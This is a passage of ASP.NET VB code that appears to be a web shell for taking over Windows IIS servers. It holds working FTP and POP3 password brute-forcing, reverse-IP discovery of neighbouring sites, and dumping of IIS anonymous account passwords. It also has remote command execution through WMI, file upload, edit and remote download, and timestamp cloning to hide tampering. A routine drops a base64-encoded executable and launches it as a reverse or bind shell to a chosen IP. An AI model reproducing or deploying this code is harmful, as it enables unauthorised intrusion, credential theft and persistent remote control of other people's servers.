            Dim oIADs
            Dim oContainer = GetObject("WinNT://" & DomainName & "")
            For Each oIADs In oContainer
                If (oIADs.Class = "User") Then
                    UserFromLocalhost.Add(oIADs.Name)
                End If
            Next
        Catch
            Try
                Dim entriesRead, totalEntries, hResume As Integer
                Dim bufPtr As IntPtr
                NetUserEnum(DomainName, 2, 2, bufPtr, -1, entriesRead, totalEntries, hResume)
                If entriesRead > 0 Then
                    Dim iter As IntPtr = bufPtr
                    For i As Integer = 0 To entriesRead - 1
                        ' Dim userInfo As USER_INFO_0 = CType(Marshal.PtrToStructure(iter, GetType(USER_INFO_0)), USER_INFO_0)
                        '  iter = New IntPtr(iter.ToInt32 + Marshal.SizeOf(GetType(USER_INFO_0)))
                        UserFromLocalhost.Add("userInfo.name")
                    Next
                End If
                NetApiBufferFree(bufPtr)
            Catch
                UserFromLocalhost.Add("nouser")
            End Try
        End Try
        Return UserFromLocalhost
    End Function
    Public Function GetUserFromRemotlyServer(ByVal DomainName As String, ByVal UserName As String, ByVal Password As String) As ArrayList
        Dim UserFromLocalhost As New ArrayList()
        Dim RemotlyServerObject As Object
        Dim oIADs, oContainer
        RemotlyServerObject = GetObject("WinNT:")
        Try
            oContainer = RemotlyServerObject.OpenDSObject("WinNT://" & DomainName & "", UserName, Password, 0)
            For Each oIADs In oContainer
                If (oIADs.Class = "User") Then
                    UserFromLocalhost.Add(oIADs.Name)
                End If
            Next
            NetUseDel("", "\\" & DomainName & "\IPC$", 2)
        Catch ex As Exception
            UserFromLocalhost.Add(ex.Message)
        End Try
        		
        RemotlyServerObject = Nothing
        oContainer = Nothing
        Return UserFromLocalhost
    End Function
    
    Public Function ReadiniFile(ByVal iniFile As String) As ArrayList
        Dim HostFromFile As New ArrayList()
        Try
            Dim sr As StreamReader = New StreamReader(HttpContext.Current.Server.MapPath(iniFile))
            Dim website As String
            Do While sr.Peek() <> -1
                website = sr.ReadLine()
                If website <> "" Then
                    HostFromFile.Add(website.Trim())
                End If
            Loop
            sr.Close()
            sr = Nothing
        Catch
        End Try
        Return HostFromFile
    End Function
    
    Public Function GetHostFromMyIpNeighbors(ByVal http As String) As ArrayList
        Dim HostFromVnpower As New ArrayList()
        Dim myDatabuffer As String
        Dim sURL As String = "http://www.my-ip-neighbors.com/?domain=" & http
        Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)
        Dim objResponse As WebResponse = objNewRequest.GetResponse
        Dim objStream As New StreamReader(objResponse.GetResponseStream())
        myDatabuffer = objStream.ReadToEnd()
        Do While myDatabuffer.IndexOf(" ><a href=") <> -1
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf(" ><a href=") + 16)
            Dim website As String = myDatabuffer.Substring(2, myDatabuffer.IndexOf("class=") - 4)
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("class=") - 4)
            HostFromVnpower.Add(website.Trim())
        Loop
                
        Return HostFromVnpower
    End Function
    Public Function GetHostFromWhosonMyServer(ByVal http As String) As ArrayList
        Dim HostFromWhosonMyServer As New ArrayList()
        Dim myDatabuffer As String
        Dim sURL As String = "http://whosonmyserver.com/?s=" & http & "&submit=Lookup"
        Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)
        Dim objResponse As WebResponse = objNewRequest.GetResponse
        Dim objStream As New StreamReader(objResponse.GetResponseStream())
        myDatabuffer = objStream.ReadToEnd()
        If myDatabuffer.IndexOf("<table>") <> -1 Then
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("<table>") + 7)
        End If
        If myDatabuffer.IndexOf("</body>") <> -1 Then
            myDatabuffer = myDatabuffer.Substring(0, myDatabuffer.IndexOf("</body>"))
        End If
        Do While myDatabuffer.IndexOf("<br />") <> -1
            '  myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("<br />") + 8)
            '  myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("http://") + 7)
            Dim website As String = myDatabuffer.Substring(0, myDatabuffer.IndexOf("<br />"))
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("<br />") + 6)
            HostFromWhosonMyServer.Add(website)
        Loop
        Response.Write(myDatabuffer)
        Return HostFromWhosonMyServer
    End Function
    Sub RunPOP3Brute(ByVal Src As Object, ByVal E As EventArgs)
        If POP3Domain.Text <> "" Then
            Dim POP3true, POP3false As String
            POP3true = ""
            POP3false = ""
            resultPOP3Brute.Text = ""
            Dim mypassword As String = ""
            If (CheckPort(POP3Domain.Text, 110) <> False) Then
                resultPOP3Brute.Text = "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>IpAddress<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
                Dim pop3hosting As New ArrayList
                pop3hosting = ReadiniFile("domain.txt")
                mypassword = POP3Password.Text
                For Each pop3user As String In pop3hosting
                    
                    If POP3CheckBoxPeer.Checked Then
                        mypassword = pop3user.Substring(0, pop3user.IndexOf("@"))
                    Else
                        If pop3user.IndexOf("@") <> -1 Then
                            pop3user = pop3user.Substring(0, pop3user.IndexOf("@"))
                            mypassword = pop3user
                        End If
                    End If
                    
                    If POP3Password.Text <> "" Then
                        mypassword = POP3Password.Text
                    Else
                        If POP3Concat.Text <> "" Then
                            If POP3CheckBoxAtHomeUser.Checked Then
                                mypassword = POP3Concat.Text & mypassword
                            Else
                                mypassword = mypassword & POP3Concat.Text
                            End If
                        End If
                    End If
                    'LOGResponsePOP3
                    If (CheckPOP3(POP3Domain.Text, pop3user, mypassword) <> False) Then
                        POP3true &= "<tr>"
                        POP3true &= "<td><b>" & pop3user & "</b></td>"
                        POP3true &= "<td><center>" & mypassword & "</center></td>"
                        POP3true &= "<td><center>" & POP3Domain.Text & "</center></td>"
                        POP3true &= "<td><center><font color=red><b>True </b></font></center></td>"
                        POP3true &= "</tr>"
                    Else
                        POP3false &= "<tr>"
                        POP3false &= "<td><b>" & pop3user & "</b></td>"
                        POP3false &= "<td><center>" & mypassword & "</center></td>"
                        POP3false &= "<td><center>" & POP3Domain.Text & "</center></td>"
                        POP3false &= "<td><center>False </center></td>"
                        POP3false &= "</tr>"
                    End If
                Next
                resultPOP3Brute.Text &= POP3true & POP3false & "</table>"
            End If
        Else
            resultPOP3Brute.Text &= "<hr><b>ip " & IpAddress.Text & ":21" & ".........close</b>"
        End If
    End Sub
    Sub RunFtpBrute(ByVal Src As Object, ByVal E As EventArgs)
        Dim mypassword As String = ""
        If IpAddress.Text <> "" Then
            Dim Ftptrue, Ftpfalse As String
            Ftptrue = ""
            Ftpfalse = ""
            resultFtpBrute.Text = ""
            If (CheckPort(IpAddress.Text, 21) <> False) Then
                resultFtpBrute.Text = "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>IpAddress<b></font></td><td align=center><font color=white><b>Websites<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
                Dim webhosting As New ArrayList
                If (DropDownListReverseIp.SelectedItem.Value = "www.whosonmyserver.com") Then
                    webhosting = GetHostFromWhosonMyServer(IpAddress.Text)
                End If
                If (DropDownListReverseIp.SelectedItem.Value = "www.my-ip-neighbors.com") Then
                    webhosting = GetHostFromMyIpNeighbors(IpAddress.Text)
                End If
                If (DropDownListReverseIp.SelectedItem.Value = "domain.txt") Then
                    webhosting = ReadiniFile("domain.txt")
                End If
                If (DropDownListReverseIp.SelectedItem.Value = "localhost") Then
                    If CheckBoxRemotlyBrute.Checked Then
                        webhosting = GetUserFromRemotlyServer(IpAddress.Text, TextBoxNameBrute.Text, TextBoxPasswordBrute.Text)
                    Else
                        webhosting = GetUserFromLocalhost(".")
                    End If
                End If
                For Each website As String In webhosting
                    Dim websitename As String = website
                    mypassword = website
                    If website.IndexOf("www.") <> -1 Then
                        website = website.Substring(website.IndexOf("www.") + 4)
                    End If
                    If CheckBoxPeer.Checked Then
                        mypassword = website.Substring(0, website.IndexOf("."))
                    Else
                        If website.IndexOf(".") <> -1 Then
                            website = website.Substring(0, website.IndexOf("."))
                            mypassword = website
                        End If
                    End If
                
                    If ConcatUser.Text <> "" Then
                        website = website & ConcatUser.Text
                    End If
                    If CheckPassword.Text <> "" Then
                        mypassword = CheckPassword.Text
                    Else
                        If Concat.Text <> "" Then
                            If CheckBoxAtHomeUser.Checked Then
                                mypassword = Concat.Text & mypassword
                            Else
                                mypassword = mypassword & Concat.Text
                            End If
                        End If
                    End If
                    If CheckBoxRemove.Checked Then
                        If CheckRemove.Text <> "" Then
                            website = website.Replace(CheckRemove.Text, "")
                        End If
                    End If
                    If CheckBoxReverseFtp.Checked Then
                        mypassword = StrReverse(mypassword)
                    End If
                    If (CheckFtp(IpAddress.Text, website, mypassword) <> False) Then
                        Ftptrue &= "<tr>"
                        Ftptrue &= "<td><b>" & website & "</b></td>"
                        Ftptrue &= "<td><center>" & mypassword & "</center></td>"
                        Ftptrue &= "<td><center>" & IpAddress.Text & "</center></td>"
                        Ftptrue &= "<td><center>" & websitename & "</center></td>"
                        Ftptrue &= "<td><center><font color=red><b>True </b></font></center></td>"
                        Ftptrue &= "</tr>"
                    Else
                        Ftpfalse &= "<tr>"
                        Ftpfalse &= "<td><b>" & website & "</b></td>"
                        Ftpfalse &= "<td><center>" & mypassword & "</center></td>"
                        Ftpfalse &= "<td><center>" & IpAddress.Text & "</center></td>"
                        Ftpfalse &= "<td><center>" & websitename & "</center></td>"
                        Ftpfalse &= "<td><center>False </center></td>"
                        Ftpfalse &= "</tr>"
                    End If
                Next
                resultFtpBrute.Text &= Ftptrue & Ftpfalse & "</table>"
            Else
                resultFtpBrute.Text &= "<hr><b>ip " & IpAddress.Text & ":21" & ".........close</b>"
            End If
        End If
    End Sub

    Sub CloneTime(ByVal Src As Object, ByVal E As EventArgs)
        existdir(time1.Text)
        existdir(time2.Text)
        Dim thisfile As FileInfo = New FileInfo(time1.Text)
        Dim thatfile As FileInfo = New FileInfo(time2.Text)
        thisfile.LastWriteTime = thatfile.LastWriteTime
        thisfile.LastAccessTime = thatfile.LastAccessTime
        thisfile.CreationTime = thatfile.CreationTime
        Response.Write("<font color=""red"">Clone Time Success!</font>")
    End Sub
    Sub Editor(ByVal Src As Object, ByVal E As EventArgs)
        Dim mywrite As New StreamWriter(filepath.Text, False, Encoding.Default)
        mywrite.Write(content.Text)
        mywrite.Close()
        Response.Write("<script>alert('Edit|Creat " & Replace(filepath.Text, "\", "\\") & " Success!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Getparentdir(filepath.Text)) & "'</sc" & "ript>")
    End Sub
    Sub GetDownloadFileRemote(ByVal Src As Object, ByVal E As EventArgs)
        Dim filename, loadpath As String
        filename = downloadfileRemote.Text
        url = Request.Form("SaveAsPath")
        loadpath = url & SaveAsFile.Text
        If File.Exists(loadpath) = True Then
            Response.Write("<script>alert('File " & Replace(loadpath, "\", "\\") & " have existed , download fail!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
            Response.End()
        End If
        Try
            Dim objNewRequest As WebRequest = HttpWebRequest.Create(filename)
            Dim objResponse As WebResponse = objNewRequest.GetResponse
            Dim objStream As Stream = objResponse.GetResponseStream()
            Dim objlength As Integer = objResponse.ContentLength
            Dim objbytes(objlength) As Byte
            For i As Integer = 0 To objlength - 1
                objbytes(i) = objStream.ReadByte()
            Next
            Dim objoutput As New FileStream(loadpath, FileMode.OpenOrCreate, FileAccess.Write)
            objoutput.Write(objbytes, 0, objbytes.Length)
            objoutput.Close()
            Response.Write("<script>alert('File " & filename & " download success!\nFile info:\n\nClient Path:" & Replace(downloadfileRemote.Text, "\", "\\") & "\nFile Size:" & objlength & " bytes\nSave Path:" & Replace(loadpath, "\", "\\") & "\n');")
            Response.Write("location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
        Catch ex As Exception
            Response.Write("<script>alert('File " & Replace(loadpath, "\", "\\") & " Access Denied , download fail!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
            Response.End()
        End Try
    End Sub
    Sub UpLoad(ByVal Src As Object, ByVal E As EventArgs)
        Dim filename, loadpath As String
        url = Request.Form("SaveAsPath")
        filename = Path.GetFileName(UpFile.Value)
        loadpath = url & filename
        If File.Exists(loadpath) = True Then
            Response.Write("<script>alert('File " & Replace(loadpath, "\", "\\") & " have existed , upload fail!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
            Response.End()
        End If
        UpFile.PostedFile.SaveAs(loadpath)
        Response.Write("<script>alert('File " & filename & " upload success!\nFile info:\n\nClient Path:" & Replace(UpFile.Value, "\", "\\") & "\nFile Size:" & UpFile.PostedFile.ContentLength & " bytes\nSave Path:" & Replace(loadpath, "\", "\\") & "\n');")
        Response.Write("location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
    End Sub
    Sub NewFD(ByVal Src As Object, ByVal E As EventArgs)
        url = Request.Form("src")
        If NewFile.Checked = True Then
            Dim mywrite As New StreamWriter(url & NewName.Text, False, Encoding.Default)
            mywrite.Close()
            Response.Redirect(Request.ServerVariables("URL") & "?action=edit&src=" & Server.UrlEncode(url & NewName.Text))
        Else
            Directory.CreateDirectory(url & NewName.Text)
            Response.Write("<script>alert('Creat directory " & Replace(url & NewName.Text, "\", "\\") & " Success!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
        End If
    End Sub
    Function CheckExt(ByVal FileExt As String, ByVal FileName As String, ByVal DimFileExt As String) As Boolean
        If DimFileExt = "*.*" Then Return True
        Dim i
        Dim Ext = Split(DimFileExt, ";")
        For i = 0 To UBound(Ext)
            If LCase("*" & FileExt).ToLower() = Ext(i).ToLower() Then
                Return True
            End If
        Next
        If DimFileExt.ToLower() = FileName.ToLower() Then Return True
    End Function
    Function SearchFileContent(ByVal FilePath As String, ByVal InFile As String) As String
        Try
            Dim allline As String = ""
            Dim myReader As StreamReader
            myReader = File.OpenText(FilePath)
            Dim LineReader As String
            Dim lineCounter As Integer = 0
            Do While myReader.Peek() <> -1
                LineReader = myReader.ReadLine()
                If InStr(1, LineReader, LCase(InFile), 1) Then
                    allline &= (lineCounter + 1).ToString() & ";"
                End If
                lineCounter = lineCounter + 1
            Loop
            myReader.Close()
            myReader = Nothing
            Return allline
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Sub DisplayTree(ByVal Dir As String)
        Try
            Dim Dirs As String() = Directory.GetDirectories(Dir)
            Dim mydir As New DirectoryInfo(Dir)
            Dim Filename As FileInfo
            For Each Filename In mydir.GetFiles()
                Dim filepath2 As String
                filepath2 = Server.UrlEncode(Dir & "/" & Filename.Name)
                If CheckExt(Filename.Extension, Filename.Name, TextBoxSF.Text) = True Then
                    If TextBoxSC.Text <> "" Then
                        Dim linfound As String = SearchFileContent(Dir & "\" & Filename.Name, TextBoxSC.Text)
                        If linfound <> "" Then
                            LabelSF.Text &= "<tr><td>" & Filename.Name & "</td>"
                            LabelSF.Text &= "<td>" & GetSize(Filename.Length) & "</td>"
                            LabelSF.Text &= "<td>" & File.GetLastWriteTime(Dir & "/" & Filename.Name) & "</td>"
                            If Filename.Extension <> ".mdb" Then
                                LabelSF.Text &= "<td><a href='?action=view&src=" & filepath2 & "&index=" & linfound & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
                            Else
                                LabelSF.Text &= "<td><a href='?action=view&src=" & filepath2 & "'><b>View</b></a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
                            End If
                            LabelSF.Text &= "</tr>"
                        End If
                    Else
                        LabelSF.Text &= "<tr><td>" & Filename.Name & "</td>"
                        LabelSF.Text &= "<td>" & GetSize(Filename.Length) & "</td>"
                        LabelSF.Text &= "<td>" & File.GetLastWriteTime(Dir & "/" & Filename.Name) & "</td>"
                        If Filename.Extension <> ".mdb" Then
                            LabelSF.Text &= "<td><a href='?action=edit&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
                        Else
                            LabelSF.Text &= "<td><a href='?action=ReadDbManager&DbDatabase=" & filepath2 & "&DbDriver=Microsoft.Jet.OLEDB.4.0" & "'><b>View</b></a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
                        End If
                        LabelSF.Text &= "</tr>"
                    End If
                End If
            Next
            Dim DirectoryName As String
            For Each DirectoryName In Dirs
                DisplayTree(DirectoryName)
            Next
        Catch ex As Exception

        End Try
    End Sub
    Function htmlspecialchars(ByVal text As String) As String
        text = Replace(text, "&", "&amp;")
        text = Replace(text, """", "&quot;")
        text = Replace(text, "'", "&#039;")
        text = Replace(text, "<", "&lt;")
        text = Replace(text, ">", "&gt;")
        Return text
    End Function
    Sub SearchFile(ByVal Src As Object, ByVal E As EventArgs)
        url = Request.Form("src")
        LabelSF.Text = "<hr><table width='90%'  border='0' align='center'><tr><td width='40%'><strong>Name</strong></td><td width='15%'><strong>Size</strong></td><td width='20%'><strong>ModifyTime</strong></td><td width='25%'><strong>Operate</strong></td></tr>"
        DisplayTree(url)
        LabelSF.Text &= "</table>"
    End Sub
    Sub del(ByVal a)
        If Right(a, 1) = "\" Then
            Dim xdir As DirectoryInfo
            Dim mydir As New DirectoryInfo(a)
            Dim xfile As FileInfo
            For Each xfile In mydir.GetFiles()
                File.Delete(a & xfile.Name)
            Next
            For Each xdir In mydir.GetDirectories()
                Call del(a & xdir.Name & "\")
            Next
            Directory.Delete(a)
        Else
            File.Delete(a)
        End If
    End Sub
    Sub copydir(ByVal a, ByVal b)
        Dim xdir As DirectoryInfo
        Dim mydir As New DirectoryInfo(a)
        Dim xfile As FileInfo
        For Each xfile In mydir.GetFiles()
            File.Copy(a & "\" & xfile.Name, b & xfile.Name)
        Next
        For Each xdir In mydir.GetDirectories()
            Directory.CreateDirectory(b & Path.GetFileName(a & xdir.Name))
            Call copydir(a & xdir.Name & "\", b & xdir.Name & "\")
        Next
    End Sub
    Function xexistfile(ByVal path As String) As Boolean
        path = Server.UrlDecode(path)
        Try
            Dim fInfo As New FileInfo(path)
            If fInfo.Exists Then
                Return True
            End If
        Catch ex As Exception
        End Try
        Return False
    End Function
    Function xfilesave(ByVal FileName As String, ByVal allbytes() As Byte) As Boolean
        Dim fi As New FileInfo(FileName)
        If fi.Exists Then
            fi.Delete()
            If fi.Exists Then
                Return False
            End If
        End If  
        Dim objoutput As New FileStream(FileName, FileMode.OpenOrCreate, FileAccess.Write)
        objoutput.Write(allbytes, 0, allbytes.Length)
        objoutput.Close()
        Dim ffi As New FileInfo(FileName)
        If ffi.Exists Then
            Return True
        End If
        Return False
    End Function
    Sub xexistdir(ByVal temp, ByVal ow)
        If Directory.Exists(temp) = True Or File.Exists(temp) = True Then
            If ow = 0 Then
                Response.Redirect(Request.ServerVariables("URL") & "?action=samename&src=" & Server.UrlEncode(url))
            ElseIf ow = 1 Then
                del(temp)
            Else
                Dim d As String = Session("cutboard")
                If Right(d, 1) = "\" Then
                    TEMP1 = url & Second(Now) & Path.GetFileName(Mid(Replace(d, "", ""), 1, Len(Replace(d, "", "")) - 1))
                Else
                    TEMP2 = url & Second(Now) & Replace(Path.GetFileName(d), "", "")
                End If
            End If
        End If
    End Sub
    Sub existdir(ByVal temp)
        If File.Exists(temp) = False And Directory.Exists(temp) = False Then
            Response.Write("<script>alert('Don\'t exist " & Replace(temp, "\", "\\") & " ! Is it a CD-ROM ?');</sc" & "ript>")
            Response.Write("<br><br><a href='javascript:history.back(1);'>Click Here Back</a>")
            Response.End()
        End If
    End Sub
    Function State2Desc(ByVal nState)
        Select Case nState
            Case 1
                State2Desc = "Starting"
            Case 2
                State2Desc = "Started"
            Case 3
                State2Desc = "Stopping"
            Case 4
                State2Desc = "Stopped"
            Case 5
                State2Desc = "Pausing"
            Case 6
                State2Desc = "Paused"
            Case 7
                State2Desc = "Continuing"
            Case Else
                State2Desc = "Unknown"
        End Select
    End Function
    Function EnumWebsites(ByVal ObjName, ByVal Objclass, ByVal objService, ByVal user, ByVal pass)
        Dim objWebServer, objWebServerRoot
        Dim Enuminfo As String = ""
        Dim Order As Integer = 0
        Dim Aus, Pus, Apid, Paus
        On Error Resume Next
        For Each objWebServer In objService
            If objWebServer.Class = Objclass Then
                Dim oADSIObject = GetObject("IIS:")
                objWebServerRoot = GetObject(objWebServer.adspath & "/ROOT")
                If ObjName <> "W3SVC" Then
                    Aus = objWebServer.AnonymousUserName
                    Pus = objWebServer.AnonymousUserPass
                    Apid = ""
                Else
                    Aus = objWebServerRoot.AnonymousUserName
                    Pus = objWebServerRoot.AnonymousUserPass
                    Apid = objWebServerRoot.AppPoolId
                End If
                Order = Order + 1
                Enuminfo += "<TR><TD align=center>" + Order.ToString() + "</TD>"
                Enuminfo += "<TD align=center>" + objWebServer.Name + "</TD>"
                Enuminfo += "<TD align=center>" + State2Desc(objWebServer.ServerState) + "</TD>"         
                Enuminfo += "<TD align=center>" + Aus + "</TD>"
                Enuminfo += "<TD align=center>" + Pus + "</TD>"
                Enuminfo += "<TD align=center>" + Apid + "</TD>"
                Enuminfo += "<TD align=center>" + objWebServer.Get("ServerBindings")(0) + "</TD>"
                Enuminfo += "<TD align=center><a href=" + Request.ServerVariables("PATH_INFO") + "?action=goto&src=" + Server.UrlEncode(objWebServerRoot.path) + "\&username=" + Server.UrlEncode(Aus) + "&password=" + Server.UrlEncode(Aus) + ">" + objWebServerRoot.Path + "\</a></TD>"
                
            End If
        Next
        Return Enuminfo
    End Function
    Function EnumObject(ByVal ObjName, ByVal Objclass, ByVal Computer, ByVal User, ByVal Password) As String
        Dim FullPath = "IIS://" & Computer & "/" & ObjName
        Dim oADSIObject = GetObject("IIS:")
        Try
            Dim objWebserver = oADSIObject.OpenDSObject(FullPath, User, Password, 0)
            Return EnumWebsites(ObjName, Objclass, objWebserver, User, Password)
        Catch ex As Exception
            Return "Unable to access object : " & ObjName & " on computer: " & Computer & vbCrLf & "<br>"
        End Try   
    End Function
    Sub RunAdminRK(ByVal Src As Object, ByVal E As EventArgs)
        LabelRootKit.Text = ""
        Try
            Select Case DropDownService.SelectedItem.Value.Trim()
                Case "W3SVC", "MSFTPSVC", "NNTPSVC"
                    LabelRootKit.Text = "<hr><TABLE width=100% align=center border=0><TR align=center><TD width=5%><B>Order</B></TD><TD width=5%><B>Site ID</B></TD><TD width=20%><B>State</B></TD><TD width=20%><B>USER</B></TD><TD width=20%><B>PASS</B></TD><TD width=20%><B>App_Pool_Id</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>"
                    LabelRootKit.Text &= EnumObject(DropDownService.SelectedItem.Value.Trim(), DropDownService.SelectedItem.Text.Trim(), HostRootKit.Text, UserRootKit.Text, PasswordRootKit.Text)
                    LabelRootKit.Text &= "</TABLE>"
                Case "srv", "pro", "homedirectory", "user"
                    Response.Redirect(Request.ServerVariables("URL") & "?action=" & DropDownService.SelectedItem.Value.Trim() & "&ht=" & HostRootKit.Text & "&us=" & UserRootKit.Text & "&pa=" & PasswordRootKit.Text)
                Case "cmd"
                    Dim Cmd
                    If CmdRK.Text = "" Then
                        Cmd = "ipconfig /all"
                    Else
                        cmd = CmdRK.Text
                    End If
                    Dim objLocator = CreateObject("WbemScripting.SWbemLocator")
                    Dim objWMIService = objLocator.ConnectServer(HostRootKit.Text, "root/cimv2", UserRootKit.Text, PasswordRootKit.Text)
                    objWMIService.Security_.impersonationlevel = 3
                    Dim iPID, bFlag
                    Dim oProcess = objWMIService.Get("Win32_Process")
                    Dim strExe = "cmd.exe /c " & Cmd & " > " & """" & "c:\1.txt" & """"
                    bFlag = oProcess.Create(strExe, Nothing, Nothing, iPID)
                    Response.Write(iPID)
                    
                    
            End Select
            
        Catch ex As Exception
            LabelRootKit.Text = "This function is disabled by server<br>"
            LabelRootKit.Text &= ex.Message
        End Try
    End Sub
    Function XRunRvConnect(ByVal fpath As String, ByVal base64 As String, ByVal port As String, ByVal ip As String) As Boolean
        Dim con() As Byte = Convert.FromBase64String(wBind)
        Dim ok As Boolean = False
        Dim final As String = ""
        If (xexistfile(fpath)) Then
            'LabelRvConnect.Text = fpath
            Return True
        End If
        If (xfilesave(fpath, con)) Then
            Dim p As Process = New Process
            With p.StartInfo
                .FileName = fpath
                .CreateNoWindow = True
                .Arguments = port & " " & ip
            End With
            p.Start()
            Return True
        End If
        Return False
    End Function
    Sub RunRvConnect(ByVal Src As Object, ByVal E As EventArgs)
        Dim port As String = PortRvConnect.Text
        Dim ClientIP As String = IpRvConnect.Text
        Dim fpath As String = Server.UrlDecode(Trim(Request.Form("PathRvConnect"))) & "RvConnect.exe"
        If CheckBoxListen.Checked Then
            If (XRunRvConnect(fpath, wBind, port, "")) Then
            End If
            LabelRvConnect.Text = "Listen"
        Else
            If (XRunRvConnect(fpath, wBind, port, ClientIP)) Then
            End If
            LabelRvConnect.Text = "Back Connect"
        End If
    End Sub
    Sub RunftpConnect(ByVal Src As Object, ByVal E As EventArgs)
        LabelFtpSwitch.Text = ""
        If ftpServerIP.Text <> "" Then
            Try
                'http://www.nsftools.com/tips/RawFTP.htm#LIST
                Dim POPResponse As String
                Dim Server As TcpClient = New TcpClient(ftpServerIP.Text, 21)
                Dim NetStrm = Server.GetStream
                Dim RdStrm = New StreamReader(Server.GetStream)
                POPResponse = RdStrm.ReadLine
                LabelFtpSwitch.Text += POPResponse + "<br>"
                Dim data As String = "USER " + ftpUserID.Text + vbCrLf
                Dim szData() As Byte = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
                NetStrm.Write(szData, 0, szData.Length)
                POPResponse = RdStrm.ReadLine
                LabelFtpSwitch.Text += POPResponse + "<br>"
                data = "PASS " & ftpPassword.Text & vbCrLf
                szData = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
                NetStrm.Write(szData, 0, szData.Length)
                POPResponse = RdStrm.ReadLine
                LabelFtpSwitch.Text += POPResponse + "<br>"
                data = "QUIT " & vbCrLf
                szData = System.Text.Encoding.ASCII.GetBytes(data.ToCharArray())
                NetStrm.Write(szData, 0, szData.Length)
                POPResponse = RdStrm.ReadLine
                LabelFtpSwitch.Text += POPResponse + "<br>"
            Catch ex As Exception
                LabelFtpSwitch.Text += ex.Message + "<br>"
            End Try
        End If
    End Sub
    Sub RunLogOnAs(ByVal Src As Object, ByVal E As EventArgs)
    Dim path As ManagementPath = New ManagementPath 
            path.Server = System.Environment.MachineName 
            path.NamespacePath = "root\CIMV2"
            path.RelativePath = "Win32_service.Name='" + Request.Form("NameLogOnAs") + "'"
            Dim servi As ManagementObject = New ManagementObject(path)
            
            Dim inParams As ManagementBaseObject = servi.GetMethodParameters("Change")
            Dim stservi = servi.GetPropertyValue("StartName").ToString
            Select Case RadioListUser.SelectedItem.Text
                Case "LocalSystem"
                    inParams("StartName") = "LocalSystem"
                    inParams("StartPassword") = ""
                Case "NT AUTHORITY\NetworkService"
                    inParams("StartName") = "NT AUTHORITY\NetworkService"
                    inParams("StartPassword") = ""
                Case "This account"
                    inParams("StartName") = LAname.Text
                    inParams("StartPassword") = LApass.Text
            End Select                          
            Dim tem1 As ManagementBaseObject = servi.InvokeMethod("Change", inParams, Nothing)
            Response.Write("<script>alert(""Process " & Request.Form("NameLogOnAs") & " Change!"");location.href='" & Request.ServerVariables("URL") & "?action=srv" & "'</sc" & "ript>")          
    End Sub
    Sub RunSQLCMD(ByVal Src As Object, ByVal E As EventArgs)
        Dim adoConn, strQuery, recResult, strResult, arrResults, Number_Of_Fields, Number_Of_Records, A, R, F
        strResult = ""
        resultSQL.Text = ""
        If SqlName.Text <> "" Then
            Try
                adoConn = Server.CreateObject("ADODB.Connection")
                If CheckBoxWinInt.Checked Then
                    adoConn.Open("Provider=SQLOLEDB.1;Server=" & ip.Text & ";Trusted_Connection=yes")
                Else
                    adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text)
                End If
                If Sqlcmd.Text <> "" Then
                    If Sqlqurey.Checked Then
                        recResult = adoConn.Execute(Sqlcmd.Text)
                        If Not recResult.EOF Then
                            arrResults = recResult.GetRows()
                            Number_Of_Fields = CDbl(UBound(arrResults, 1))
